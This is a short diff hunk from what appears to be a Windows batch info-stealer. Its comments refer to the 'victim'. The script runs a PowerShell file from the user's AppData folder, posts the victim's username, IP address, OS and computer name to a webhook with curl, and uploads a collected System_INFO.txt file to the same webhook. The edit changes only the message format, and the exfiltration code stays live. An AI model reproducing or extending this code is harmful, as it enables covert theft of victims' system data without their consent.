@@ -91,7 +91,7 @@ Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\
 ::sends the username, ip, current time, and date of the victim
 
 
-curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```User %username% : %ip% time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```User = %username%  Ip = %ip% time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%
 
 ::sends all files
 curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\System_INFO.txt %webhook%
